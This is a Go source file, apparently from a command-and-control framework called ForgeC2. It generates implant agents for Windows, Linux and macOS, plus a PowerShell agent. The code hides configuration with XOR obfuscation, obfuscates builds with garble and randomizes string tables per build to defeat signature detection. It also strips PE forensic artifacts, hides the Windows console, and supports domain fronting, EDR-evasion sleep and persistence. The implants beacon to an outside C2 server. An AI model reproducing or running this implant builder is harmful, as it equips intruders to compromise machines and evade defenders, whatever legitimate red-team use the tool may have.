package payload

import (
	"bytes"
	"embed"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"text/template"
)

//go:embed agent/* powershell_template.ps1 profiles/*
var payloadFS embed.FS

var (
	cachedGoCmd string
	goCmdOnce   sync.Once
)

// escape replaces special characters for Go string literals.
func escape(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `"`, `\"`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	s = strings.ReplaceAll(s, "\r", `\r`)
	return s
}

// buildLdflags constructs the full -ldflags content string for go build.
// Agent runtime configuration is carried in a single XOR-obfuscated blob
// injected via -X main.ConfigBlob (see buildConfigBlob); everything else is
// resolved from the blob at agent init(). Only build-level flags remain.
func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) string {
	blob := buildConfigBlob(cfg, profile)

	flags := "-s -w -buildid="
	if goos == "windows" {
		flags += " -H=windowsgui"
	}
	if blob != "" {
		flags += ` -X "main.ConfigBlob=` + escape(blob) + `"`
	}
	return flags
}

// buildGoMod generates a go.mod file for the target OS.
func buildGoMod(goos string, isDLL bool) string {
	replaceDir := forgeC2ModuleReplace()

	deps := []string{}
	deps = append(deps, "\tgolang.org/x/sys v0.42.0")

	if !isDLL {
		deps = append(deps, "\tgolang.org/x/net v0.42.0")
	}

	if goos == "windows" {
		deps = append(deps, "\tgithub.com/Microsoft/go-winio v0.6.2")
		deps = append(deps, "\tmodernc.org/sqlite v1.52.0")
	}

	if goos == "windows" && !isDLL {
		deps = append(deps, "\tgoogle.golang.org/grpc v1.71.0")
		deps = append(deps, "\tnhooyr.io/websocket v1.8.17")
	}

	base := "module agent\n\ngo 1.25\n\nrequire (\n"
	base += strings.Join(deps, "\n") + "\n)\n"
	return base + replaceDir
}

// getGoCmd returns the path to the Go executable.
// It first tries exec.LookPath, then common installation locations (especially useful
// on Windows when the server.exe is launched without a full user PATH, e.g. by double-click).
func getGoCmd() string {
	goCmdOnce.Do(func() {
		// Allow overriding via environment (advanced users / CI)
		if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
			if _, err := os.Stat(goBinary); err == nil {
				cachedGoCmd = goBinary
				return
			}
			// env var points to non-existent file; clear override and fall through
		}

		// Standard PATH lookup
		if goPath, err := exec.LookPath("go"); err == nil {
			cachedGoCmd = goPath
			return
		}

		// Windows-specific fallbacks (very common issue when running built .exe)
		if runtime.GOOS == "windows" {
			home := os.Getenv("USERPROFILE")
			candidates := []string{
				filepath.Join(home, "go", "bin", "go.exe"),
				`C:\Program Files\Go\bin\go.exe`,
				`C:\Program Files (x86)\Go\bin\go.exe`,
			}

			// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
			if sdkDir := filepath.Join(home, "sdk"); true {
				if entries, err := os.ReadDir(sdkDir); err == nil {
					for _, e := range entries {
						if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
							c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
							candidates = append(candidates, c)
						}
					}
				}
			}

			if goroot := os.Getenv("GOROOT"); goroot != "" {
				candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
			}
			if gopath := os.Getenv("GOPATH"); gopath != "" {
				candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
			}

			for _, c := range candidates {
				if _, err := os.Stat(c); err == nil {
					cachedGoCmd = c
					return
				}
			}
		}
	})
	return cachedGoCmd
}

// getGarbleCmd locates the garble binary. Same robustness as getGoCmd:
// garble is typically installed via `go install`, landing in GOPATH/bin,
// which is often missing from PATH when the server runs as a service.
func getGarbleCmd() string {
	if p, err := exec.LookPath("garble"); err == nil {
		return p
	}
	var candidates []string
	if gopath := os.Getenv("GOPATH"); gopath != "" {
		candidates = append(candidates, filepath.Join(gopath, "bin", "garble.exe"), filepath.Join(gopath, "bin", "garble"))
	}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "go", "bin", "garble.exe"),
			filepath.Join(home, "go", "bin", "garble"))
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && !info.IsDir() {
			return c
		}
	}
	return ""
}

const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

func defaultMalleableProfile() MalleableProfile {
	return MalleableProfile{
		Name:      "default",
		UserAgent: defaultWindowsUA,
		BeaconURI: "/api/v1/beacon",
		Method:    "POST",
		Headers:   map[string]string{"Accept": "*/*"},
		Sleep:     10,
		Jitter:    20,
	}
}

// UsesManualProfileSettings reports whether heartbeat/UA should come from the generate form.
func UsesManualProfileSettings(profile string) bool {
	return profile == "" || profile == "default"
}

func profileDataPath(dataDir, name string) string {
	if dataDir == "" {
		dataDir = "data"
	}
	return filepath.Join(dataDir, "profiles", name+".json")
}

func parseMalleableProfileJSON(data []byte, fallbackName string) MalleableProfile {
	var p MalleableProfile
	if err := json.Unmarshal(data, &p); err != nil {
		p = defaultMalleableProfile()
		if fallbackName != "" {
			p.Name = fallbackName
		}
		return p
	}
	if p.Name == "" {
		p.Name = fallbackName
	}
	if p.BeaconURI == "" {
		p.BeaconURI = "/api/v1/beacon"
	}
	if p.Method == "" {
		p.Method = "POST"
	}
	return p
}

// loadMalleableProfile loads a profile from data dir, embedded FS, or falls back to default.
func loadMalleableProfile(name string, dataDir string) MalleableProfile {
	if name == "" {
		name = "default"
	}
	if data, err := os.ReadFile(profileDataPath(dataDir, name)); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	profilePath := fmt.Sprintf("profiles/%s.json", name)
	if data, err := payloadFS.ReadFile(profilePath); err == nil {
		return parseMalleableProfileJSON(data, name)
	}
	p := defaultMalleableProfile()
	p.Name = name
	return p
}

// NormalizeImplantConfig applies profile rules:
// - default profile: keep manual interval/jitter/UA from the form
// - other/imported profiles: force interval/jitter/UA from the profile
func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}

	profile := loadMalleableProfile(cfg.Profile, dataDir)
	cfg.BeaconURI = profile.BeaconURI
	cfg.Method = profile.Method
	// Carry the malleable response wrapping (prepend/append) into the config
	// blob so the agent can strip it on HTTP replies. Explicit per-build
	// values win over the profile file.
	if cfg.MalleablePrepend == "" {
		cfg.MalleablePrepend = profile.Prepend
	}
	if cfg.MalleableAppend == "" {
		cfg.MalleableAppend = profile.Append
	}

	if UsesManualProfileSettings(cfg.Profile) {
		if cfg.Interval < 0 {
			cfg.Interval = 5
		}
		if cfg.Jitter == 0 {
			cfg.Jitter = 20
		}
		if cfg.UserAgent == "" {
			if profile.UserAgent != "" {
				cfg.UserAgent = profile.UserAgent
			} else {
				cfg.UserAgent = defaultWindowsUA
			}
		}
		return profile
	}

	if profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	} else if cfg.Interval == 0 {
		cfg.Interval = 5
	}
	cfg.Jitter = profile.Jitter
	if profile.UserAgent != "" {
		cfg.UserAgent = profile.UserAgent
	} else {
		cfg.UserAgent = defaultWindowsUA
	}
	return profile
}

// ListProfilePresets returns built-in and imported profile metadata for the generate UI.
func ListProfilePresets(dataDir string) []MalleableProfile {
	seen := map[string]bool{}
	var out []MalleableProfile

	if entries, err := payloadFS.ReadDir("profiles"); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			names = append(names, strings.TrimSuffix(e.Name(), ".json"))
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
			seen[name] = true
		}
	}

	customDir := filepath.Join(dataDir, "profiles")
	if entries, err := os.ReadDir(customDir); err == nil {
		names := make([]string, 0, len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
				continue
			}
			name := strings.TrimSuffix(e.Name(), ".json")
			if seen[name] {
				continue
			}
			names = append(names, name)
		}
		sort.Strings(names)
		for _, name := range names {
			p := loadMalleableProfile(name, dataDir)
			out = append(out, p)
		}
	}
	return out
}

var profileNameSanitizer = regexp.MustCompile(`[^a-zA-Z0-9_-]+`)

// SaveImportedProfile stores a user-uploaded profile JSON under data/profiles/.
func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
	p := parseMalleableProfileJSON(raw, "")
	if p.Name == "" {
		return p, fmt.Errorf("profile name is required")
	}
	p.Name = profileNameSanitizer.ReplaceAllString(strings.TrimSpace(p.Name), "_")
	if p.Name == "" {
		return p, fmt.Errorf("invalid profile name")
	}
	if dataDir == "" {
		dataDir = "data"
	}
	dir := filepath.Join(dataDir, "profiles")
	if err := os.MkdirAll(dir, 0755); err != nil {
		return p, err
	}
	p.Name = strings.TrimPrefix(p.Name, "default_")
	if p.Name == "default" {
		return p, fmt.Errorf("cannot override built-in default profile")
	}
	out, err := json.MarshalIndent(p, "", "  ")
	if err != nil {
		return p, err
	}
	if err := os.WriteFile(filepath.Join(dir, p.Name+".json"), out, 0644); err != nil {
		return p, err
	}
	return p, nil
}

// DeleteProfile removes a custom profile JSON from data/profiles/.
func DeleteProfile(dataDir string, name string) error {
	if dataDir == "" {
		dataDir = "data"
	}
	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
	if sanitized == "" || sanitized == "default" {
		return fmt.Errorf("cannot delete default profile")
	}
	path := filepath.Join(dataDir, "profiles", sanitized+".json")
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return fmt.Errorf("profile not found")
	}
	return os.Remove(path)
}

// MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
type MalleableProfile struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	UserAgent   string            `json:"user_agent"`
	BeaconURI   string            `json:"beacon_uri"`
	Method      string            `json:"method"` // GET or POST
	Headers     map[string]string `json:"headers"`
	Sleep       int               `json:"sleep"`
	Jitter      int               `json:"jitter"`
	Prepend     string            `json:"prepend,omitempty"` // bytes prepended to server HTTP responses
	Append      string            `json:"append,omitempty"`  // bytes appended to server HTTP responses
}

// ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
// All agents must be produced exclusively through the Generate page.
type ImplantConfig struct {
	C2URL         string
	Protocol      string // http, tcp, p2p
	Interval      int
	Jitter        int
	UserAgent     string
	Persist       bool
	SkipTLSVerify bool
	Filename      string // for output name
	Debug         bool   // for debug agent (shows console logs)
	Profile       string // malleable profile name
	BeaconURI     string
	Method        string
	ListenerID    uint
	P2PMode       string // "", "smb", "tcp" — how parent listens for children
	P2PParent     string // parent agent addr to connect to (child mode)
	P2PListenAddr string // parent listen addr (pipe name or tcp addr)
	DNSDomain     string // DNS C2 domain (e.g. "c2.example.com")
	DNSServer     string // DNS C2 server IP
	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
	BeaconKey     string // PSK sent as envelope "key" + X-Beacon-Key header (empty = no PSK auth)
	RegSecretID   string // v3 per-implant registration secret id (compiled into the binary)
	RegSecret     string // v3 per-implant registration secret, base64 (replaces BeaconKey in v3 builds)
	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
	MalleablePrepend string // bytes prepended to server HTTP responses (strip on parse)
	MalleableAppend  string // bytes appended to server HTTP responses (strip on parse)
	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
	DomainFront   string // CDN front domain for domain fronting ("" = disabled)
	Architecture  string // "amd64" (default), "arm64", "arm"
	// Working hours
	WorkingStart string // HH:MM start of working hours (empty = disabled)
	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
	WorkingTZ    string // IANA timezone (empty = UTC)
	// Advanced transport (injected as ldflags into agent)
	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c
	DNSDoHURL        string
	DNSDoTAddr       string
	SSHUser          string
	SSHPassword      string
	SSHKey           string // base64 PEM client private key
	SSHHostKey       string // base64 server host public key pin (empty = lab insecure)
	PinnedCertSHA256 string // SHA-256 hex of server DER cert for pinning (empty = disabled)
	SelfCheckSHA256  string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
}

// forgeC2ModuleReplace returns a `replace` directive for the local
// github.com/forgec2/forgec2 module, so the temp agent build can
// find it without requiring a remote git repository.
func forgeC2ModuleReplace() string {
	// Walk upward from the working directory to find the module root
	// (handles the server running from the project root AND go test runs,
	// where the working directory is a subpackage).
	wd, err := os.Getwd()
	if err != nil {
		wd = "."
	}
	dir := wd
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			// go.mod replace targets must use forward slashes even on Windows.
			return "\nreplace github.com/forgec2/forgec2 => " + filepath.ToSlash(dir) + "\n"
		}
		parent := filepath.Dir(dir)
		if parent == dir || parent == "." || len(parent) <= len(filepath.VolumeName(parent)) {
			break
		}
		dir = parent
	}
	return ""
}

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Make outputDir absolute to avoid issues with cmd.Dir
	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	// go.mod with required external dependencies
	goMod := buildGoMod("windows", false)

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags := buildLdflags(cfg, profile, "windows")

	// Output filename
	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.exe"
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName += ".exe"
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	// ensure the dir for outPath exists (use abs dir)
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	// Run go mod tidy to resolve dependencies
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}

	// Build command - use explicit GOOS/GOARCH
	goarch := "amd64"
	if cfg.Architecture == "arm64" {
		goarch = "arm64"
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch); err != nil {
		return "", err
	}

	// Post-build: strip PE forensic artifacts (timestamp, Rich Header, Debug
	// directory). Applied to every build — garble does not clean these.
	stripPEArtifacts(outPath)

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg ImplantConfig, dataDir string) (string, error) {
	NormalizeImplantConfig(&cfg, dataDir)

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg, filepath.Dir(outputDir))
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// extractAgentSources writes ALL Go agent source files from the embedded FS
// into the temp build directory. This enables cross-platform builds (windows/linux).
func extractAgentSources(efs embed.FS, dir string) error {
	entries, err := efs.ReadDir("agent")
	if err != nil {
		return fmt.Errorf("failed to read embedded agent dir: %w", err)
	}
	hasAgentGo := false
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".go") {
			continue
		}
		// Platform-specific sources use go:build tags; include all .go files so links resolve.
		if entry.Name() == "agent.go" {
			hasAgentGo = true
		}
		data, err := efs.ReadFile("agent/" + entry.Name())
		if err != nil {
			return fmt.Errorf("failed to read embedded agent/%s: %w", entry.Name(), err)
		}
		if err := os.WriteFile(filepath.Join(dir, entry.Name()), data, 0644); err != nil {
			return err
		}
	}
	if !hasAgentGo {
		return fmt.Errorf("embedded agent directory missing agent.go")
	}

	// Every agent build gets a freshly randomized string table (fresh XOR keys
	// per constant, plaintext comments stripped) so binaries are not
	// fingerprinter-friendly against a static table.
	if err := injectRandomizedStrxor(dir); err != nil {
		return err
	}
	return nil
}

// injectRandomizedStrxor regenerates agent/strxor.go inside the build dir with
// brand-new obfuscation values for this specific build.
func injectRandomizedStrxor(buildDir string) error {
	table, err := randomizeStrxor()
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(buildDir, "strxor.go"), table, 0644)
}

// runGoModTidy resolves go.sum entries for the temp build module. Every
// generate path must run this before `go build`; without it cross-builds
// fail with "missing go.sum entry" for OS-specific transitive imports.
func runGoModTidy(goCmd, workDir string) error {
	tidyCmd := exec.Command(goCmd, "mod", "tidy")
	tidyCmd.Dir = workDir
	var tidyOut, tidyErr bytes.Buffer
	tidyCmd.Stdout = &tidyOut
	tidyCmd.Stderr = &tidyErr
	if err := tidyCmd.Run(); err != nil {
		return fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
	}
	return nil
}

// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
// When obfuscate is requested, garble is REQUIRED: falling back to a plain
// build would silently produce an un-obfuscated implant (a false security
// promise), so a missing/broken garble fails the build instead.
func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
	if obfuscate {
		garblePath := getGarbleCmd()
		if garblePath == "" {
			return fmt.Errorf("obfuscation requested but garble is not installed: install it with `go install mvdan.cc/garble@latest`")
		}
		args := append([]string{"-literals", "-tiny", "-seed=random", "build"},
			"-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")
		cmd := exec.Command(garblePath, args...)
		cmd.Dir = workDir
		cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("garble build failed: %w\n%s\n(re-run without obfuscation or fix the garble install)", err, stderr.String())
		}
		return nil
	}
	cmd := exec.Command(goCmd, append([]string{"build"},
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
		".",
	)...)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("go build failed: %w\n%s", err, stderr.String())
	}
	return nil
}

// stripPEArtifacts removes forensic PE artifacts: timestamp, Rich Header, Debug Directory.
func stripPEArtifacts(path string) {
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 0x100 {
		return
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return // not a PE file
	}
	peOffset := int(data[0x3C]) | int(data[0x3D])<<8
	if peOffset+4 >= len(data) {
		return
	}

	// 1. Zero timestamp at PE+8
	tsOffset := peOffset + 8
	if tsOffset+4 <= len(data) {
		for i := range 4 {
			data[tsOffset+i] = 0
		}
	}

	// 2. Zero Rich Header (between DOS stub and PE signature)
	// Rich Header starts after DOS header+e_lfanew, ends at PE signature.
	// Search backwards from PE signature for "Rich" magic.
	richStart := 0
	for i := peOffset - 4; i >= 0x80; i-- {
		if data[i] == 'R' && data[i+1] == 'i' && data[i+2] == 'c' && data[i+3] == 'h' {
			richStart = i
			break
		}
	}
	if richStart > 0 {
		// Zero from Rich marker to PE signature
		for i := richStart; i < peOffset; i++ {
			data[i] = 0
		}
	}

	// 3. Clear Debug Directory entry in data directory
	// Data directory index 6 = IMAGE_DIRECTORY_ENTRY_DEBUG
	debugDirOffset := peOffset + 0x70 + 6*8 // 0x70 = offset of data directory in PE64
	if debugDirOffset+8 <= len(data) {
		for i := range 8 {
			data[debugDirOffset+i] = 0
		}
	}

	os.WriteFile(path, data, 0644)
}

// GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := buildGoMod("linux", false)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags := buildLdflags(cfg, profile, "linux")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	// Linux binaries typically have no .exe
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}
	goarch := "amd64"
	switch cfg.Architecture {
	case "arm64":
		goarch = "arm64"
	case "arm":
		goarch = "arm"
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GenerateMacOS builds a macOS agent binary via cross-compilation.
func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := buildGoMod("darwin", false)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags := buildLdflags(cfg, profile, "darwin")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}
	goarch := "amd64"
	if cfg.Architecture == "arm64" {
		goarch = "arm64"
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
